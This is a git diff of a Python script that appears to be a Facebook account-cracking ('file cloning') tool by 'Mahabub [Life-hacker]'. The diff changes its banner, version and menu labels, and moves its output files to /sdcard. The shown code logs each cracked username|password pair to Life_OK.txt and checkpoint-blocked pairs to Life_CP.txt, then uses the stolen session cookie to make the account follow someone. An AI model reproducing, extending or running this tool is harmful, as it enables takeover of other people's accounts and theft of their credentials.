@@ -1,3 +1,5 @@
+#The_script_creat_by_mahabub#
+
 #!/usr/bin/python3
 import os
 try:
@@ -83,10 +85,10 @@ logo =                                          """
                                                           
 
 \x1b[1;97m------------------------\x1b[1;97m------------------------
-\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m           Mahabub[Life-hacker]
+\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m           Mahabub vi
 \033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37m          [Life-hacker]
 \033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m           [Life-ssb]
-\033[1;31m\033[1;37m Version\x1b[1;97m : \033[1;37m             6.0.0
+\033[1;31m\033[1;37m Version\x1b[1;97m : \033[1;37m             1.0.0
 \033[1;37m------------------------\033[1;37m------------------------ """                                              
 
 def hasil(OK,cp):
@@ -105,8 +107,8 @@ def sarfraz():
     todz = ''
     IP = ipm['origin']
     print
-    print(' [1] Start File Cloning')
-    print(' [2] Create File [Best-Method]')
+    print(' [1] Start File Cloning[best]')
+    print(' [2] Create File [Not working⛔]')
     print(' [E] exit ')
     print('')
     _sarfraz___ = input(' [?] Choose option : ')
@@ -190,7 +192,7 @@ class __xxx__:
                     print(f"\r{H} [Life-OK] {user} | {pw}")
                     wrt = '%s|%s' % (user,pw)
                     ok.append(wrt)
-                    open('Life_OK.txt' , 'a').write('%s\n' % wrt)
+                    open('/sdcard/Life_OK.txt' , 'a').write('%s\n' % wrt)
                     self.follow(session,coki)
                     break
                 elif 'checkpoint' in session.cookies.get_dict():
@@ -202,7 +204,7 @@ class __xxx__:
                         print('\r%s [Life-CP] %s | %s ' % (M, user, pw))
                         wrt = '%s|%s' % (user,pw)
                         cp.append(wrt)
-                        open('Life_CP.txt' , 'a').write('%s\n' % wrt)
+                        open('/sdcard/Life_CP.txt' , 'a').write('%s\n' % wrt)
                         break
                     except (KeyError, IOError):
                         month = ''
